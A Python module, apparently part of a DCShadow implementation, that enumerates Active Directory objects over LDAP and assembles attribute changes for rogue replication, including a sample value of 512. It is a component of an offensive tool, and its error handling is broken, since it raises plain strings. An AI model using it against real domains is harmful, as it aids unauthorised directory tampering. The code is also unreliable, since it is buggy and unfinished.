import base64
import json
from R2Log import logger

from typing import List

from ldap3 import BASE
from ldap3.utils.conv import escape_filter_chars

from dcshadow.model.ReplicationAttribute import ReplicationAttribute
from dcshadow.manager.SessionsManager import SessionsManager
from impacket.dcerpc.v5 import drsuapi


def enumDistinguishedName(sam_account_name):
    logger.debug(f"Retrieving distinguished name for object: {sam_account_name}")
    ldap_client = SessionsManager().get_ldap()
    ldap_client.session.search(
        search_base=ldap_client.server.info.other["rootDomainNamingContext"][0],  # TODO mimikatz searched in the Configuration NC, don't why, but attributes are in the Schema NC, make sure we are doing the right thing here
        search_filter=f"(sAMAccountName={escape_filter_chars(sam_account_name)})",
        attributes=[
            "distinguishedName",
        ]
    )
    if len(ldap_client.session.entries) == 1:
        distinguished_name = ldap_client.session.entries[0]['distinguishedName'][0]
        logger.debug(f"Distinguished name: {distinguished_name}")
        return distinguished_name
    else:
        raise "Attribute not found"  # TODO handle it object does not exist --> to be added (https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L1378-L1384)


class ReplicationObject:
    def __init__(self, name, attributes, distinguished_name="", sid=None):
        self.name: str = name
        self.distinguished_name: str = distinguished_name or enumDistinguishedName(sam_account_name=self.name)
        self.sid = sid
        self.parent_guid: bytes
        self.attributes: List['ReplicationAttribute'] = attributes
        if self.distinguished_name:
            self.__enum()

    @staticmethod
    def builder(json_path, repl_object: str = "", repl_object_dn: str = "", repl_attribute: str = "", repl_value: str = "") -> List['ReplicationObject']:
        result = []

        # struct_json = [
        #     {
        #         "object": "bobby",
        #         "attributes": [
        #             {
        #                 "name": "description",
        #                 "value": "new desc"
        #             },
        #             {
        #                 "name": "ID",
        #                 "value": 512
        #             },
        #         ],
        #     }
        # ]
        # TODO need to define how we manage the different types of entries (int, string, binary, security descriptor, etc.)

        if (repl_object is not None or repl_object_dn is not None) and repl_attribute is not None and repl_value is not None:
            logger.debug(f"Modifying one object: name={repl_object}, distinguished_name={repl_object_dn}, attribute={repl_attribute}, value={repl_value}")
            result.append(ReplicationObject(name=repl_object, distinguished_name=repl_object_dn, attributes=ReplicationAttribute.builder([{'name': repl_attribute, 'value': repl_value}])))
        elif json_path is not None:
            logger.debug(f"Pulling modifications from JSON file at: {json_path}")
            with open(json_path, 'r') as json_file:  # TODO move this somewhere higher? and handle case when file doesn't exist. handle case where name or attributes are not set
                objects = json.load(json_file)
                logger.debug(f"JSON content: {objects}")
                for obj_name, attributes in objects.items():
                    attributes_list = []
                    for attr_name, attr_value in attributes.items():
                        attributes_list.append({'name': attr_name, 'value': attr_value})
                    result.append(ReplicationObject(name=obj_name, attributes=ReplicationAttribute.builder(attributes_list)))
        return result

    def __enum(self):
        logger.debug(f"Enumerating info for object: {self.distinguished_name}")
        ldap_client = SessionsManager().get_ldap()
        ldap_client.session.search(
            search_base=self.distinguished_name,
            search_scope=BASE,
            search_filter="(objectclass=*)",
            attributes=[
                "replPropertyMetaData",
                "objectSid",
                "objectGUID",
                "parentGUID"
            ]
        )
        if len(ldap_client.session.entries) == 1:
            self.parent_guid = ldap_client.session.entries[0]['parentGUID'][0]  # TODO set NULLGUID bytes if doesn't exist
            logger.debug(f"Parent GUID: {self.parent_guid}")
        else:
            raise "Object not found"
